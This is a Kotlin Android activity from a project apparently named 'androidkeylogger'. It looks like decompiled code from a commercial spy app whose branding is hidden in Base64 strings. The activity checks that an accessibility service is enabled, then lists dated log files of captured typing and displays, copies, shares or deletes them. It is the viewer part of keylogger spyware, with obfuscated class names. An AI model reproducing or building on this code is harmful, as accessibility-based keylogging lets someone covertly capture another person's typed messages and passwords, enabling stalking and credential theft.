package com.azamovhudstc.androidkeylogger

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.DialogInterface
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Build.VERSION
import android.os.Bundle
import android.util.Base64
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.nio.charset.StandardCharsets
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*


class MainFixActivity : AppCompatActivity() {
    private var textView: TextView? = null
    private var dateSpinner: Spinner? = null
    private var selectedItem = ""
    private var v: String? = null
    private val listHistory: MutableList<String> = ArrayList()
    var x = false

    internal inner class a : AdapterView.OnItemSelectedListener {
        override fun onItemSelected(adapterView: AdapterView<*>?, view: View, i: Int, j: Long) {
            val mainActivity = this@MainFixActivity
            mainActivity.selectedItem = mainActivity.listHistory[i]
            mainActivity.selectedItemRead(mainActivity.selectedItem)
        }

        override fun onNothingSelected(adapterView: AdapterView<*>?) {
            val str = ""
            selectedItem = str
            textView!!.text = str
        }
    }

    private fun checkPermission() {
        if (!SvcAcc.i) {
            if (!SvcAcc.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            } else if (!x) {
                x = true
                val builder = AlertDialog.Builder(this)
                builder.setTitle(getString(R.string.disclosure))
                builder.setCancelable(false)
                val stringBuilder = StringBuilder()
                stringBuilder.append(getString(R.string.using_accessibility))
                stringBuilder.append("\n\n")
                stringBuilder.append(getString(R.string.purpose))
                builder.setMessage(stringBuilder.toString())
                builder.setNegativeButton(
                    getString(R.string.cancel)
                ) { dialog, which -> dismissDialog(dialog, which) }
                builder.setPositiveButton(
                    getString(R.string.accept)
                ) { dialog, which -> dismissDialog(dialog, which) }
                builder.show()
            }
        }
    }

    private fun getDate(str: String): Date {
        return try {
            SimpleDateFormat("yyyyMMdd", Locale.getDefault()).parse(str)
        } catch (unused: Exception) {
            Date(0)
        }
    }

    private  fun dismissDialog(dialogInterface: DialogInterface, i: Int) {
        x = false
        dialogInterface.dismiss()
    }



    private    fun writeWithBase64(view: View) {
        val str = "android.intent.action.VIEW"
        val stringBuilder = StringBuilder()
        stringBuilder.append(
            String(
                Base64.decode("aHR0cHM6Ly93d3cuYS1zcHkuY29tLz8=", 0),
                StandardCharsets.UTF_8
            )
        )
        stringBuilder.append("TypingLogger")
        val stringBuilder2 = stringBuilder.toString()
        var intent: Intent
        try {
            intent = Intent(str, Uri.parse(stringBuilder2))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (unused: Exception) {
            intent = Intent(str, Uri.parse(stringBuilder2))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(Intent.createChooser(intent, "Browse with"))
        }
    }

    private   fun dialogPositiveClick(dialogInterface: DialogInterface, i: Int) {
        if (!selectedItem.isEmpty()) {
            if (File(v, selectedItem).delete()) {
                val svcAcc = SvcAcc.h
                if (svcAcc != null && svcAcc.b == selectedItem) {
                    SvcAcc.h.a()
                }
                initDate()
                return
            }
            Toast.makeText(this, getString(R.string.not_deleted), Toast.LENGTH_LONG).show()
        }
    }

    @SuppressLint("ResourceType")
    private fun initDate() {
        val str = ""
        val obj: Any = if (dateSpinner!!.selectedItem != null) listHistory[dateSpinner!!.selectedItemPosition] else str
        listHistory.clear()
        val arrayList = ArrayList<String>()
        val listFiles = File(v).listFiles()
        if (listFiles != null) {
            if (VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(listFiles, Comparator.reverseOrder())
            }
            for (name in listFiles) {
                val name2 = name.name
                val U = getDate(name2)
                if (U.time > 0) {
                    listHistory.add(name2)
                    arrayList.add(DateFormat.getDateInstance(2).format(U))
                }
            }
        }
        dateSpinner!!.adapter = ArrayAdapter(this, 17367049, arrayList)
        if (listHistory.size > 0) {
            var indexOf = listHistory.indexOf(obj)
            if (indexOf < 1) {
                selectedItem = listHistory[0]
                indexOf = 0
            }
            dateSpinner!!.setSelection(indexOf, false)
        } else {
            selectedItem = str
            textView!!.text = str
        }
        invalidateOptionsMenu()
    }

    private fun selectedItemRead(str: String) {
        val file = File(v, str)
        val stringBuilder = StringBuilder()
        try {
            val bufferedReader = BufferedReader(FileReader(file))
            while (true) {
                val readLine = bufferedReader.readLine() ?: break
                stringBuilder.append(readLine)
                stringBuilder.append("\n")
            }
            bufferedReader.close()
            val svcAcc = SvcAcc.h
            if (svcAcc != null && svcAcc.b == str) {
                stringBuilder.append(SvcAcc.h.c())
            }
            textView!!.text = stringBuilder
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
    }

    /* Access modifiers changed, original: protected */
    public override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        setContentView(R.layout.activity_main)
        v = filesDir.absolutePath
        dateSpinner = findViewById<View>(R.id.dropdown) as Spinner
        textView = findViewById<View>(R.id.textview) as TextView
        dateSpinner!!.onItemSelectedListener = a()
        val j: Long = try {
            packageManager.getPackageInfo(packageName, 0).lastUpdateTime
        } catch (unused: Exception) {
            Calendar.getInstance().timeInMillis - 300001
        }
        if (Calendar.getInstance().timeInMillis - j > 600000) {
            findViewById<View>(R.id.belolayout).setOnClickListener { view ->
                writeWithBase64(
                    view
                )
            }
            (findViewById<View>(R.id.adv1) as TextView).text =
                String(Base64.decode("VGhpcyBhcHAgaXMgcHJvdmlkZWQgYnk6", 0), StandardCharsets.UTF_8)
            (findViewById<View>(R.id.adv2) as TextView).text =
                String(Base64.decode("d3d3LmEtc3B5LmNvbQ==", 0), StandardCharsets.UTF_8)
            findViewById<View>(R.id.belolayout).visibility = View.VISIBLE
        }
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.btn, menu)
        return true
    }



    override fun onOptionsItemSelected(menuItem: MenuItem): Boolean {
        val itemId = menuItem.itemId
        if (itemId == R.id.action_delete) {
            val builder = AlertDialog.Builder(this)
            builder.setMessage(getString(R.string.ask_delete))
            builder.setCancelable(true)
            builder.setPositiveButton(
                getString(R.string.ok)
            ) { dialog, which -> dialogPositiveClick(dialog, which) }
            builder.setNegativeButton(
                getString(R.string.cancel)
            ) { dialog, which -> dismissDialog(dialog, which) }
            builder.show()
        } else if (itemId == R.id.action_copy) {
            val clipboardManager =
                applicationContext.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboardManager != null) {
                try {
                    clipboardManager.setPrimaryClip(
                        ClipData.newPlainText(
                            getString(R.string.content_copied),
                            textView!!.text
                        )
                    )
                } catch (e: Exception) {
                    Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
                }
            }
        } else if (itemId == R.id.action_share) {
            val intent = Intent("android.intent.action.SEND")
            intent.type = "text/plain"
            intent.putExtra("android.intent.extra.SUBJECT", getString(R.string.content_shared))
            intent.putExtra("android.intent.extra.TEXT", textView!!.text)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            startActivity(Intent.createChooser(intent, getString(R.string.share)))
        }
        return super.onOptionsItemSelected(menuItem)
    }

    /* Access modifiers changed, original: protected */
    public override fun onPause() {
        super.onPause()
    }

    override fun onPrepareOptionsMenu(menu: Menu): Boolean {
        menu.clear()
        menuInflater.inflate(R.menu.btn, menu)
        //        menu.findItem(R.id.action_delete).setVisible(this.u.isEmpty() ^ 1);
//        menu.findItem(R.id.action_copy).setVisible(this.u.isEmpty() ^ 1);
//        menu.findItem(R.id.action_share).setVisible(this.u.isEmpty() ^ 1);
        return super.onPrepareOptionsMenu(menu)
    }

    /* Access modifiers changed, original: protected */
    public override fun onResume() {
        super.onResume()
        initDate()
        checkPermission()
    }
}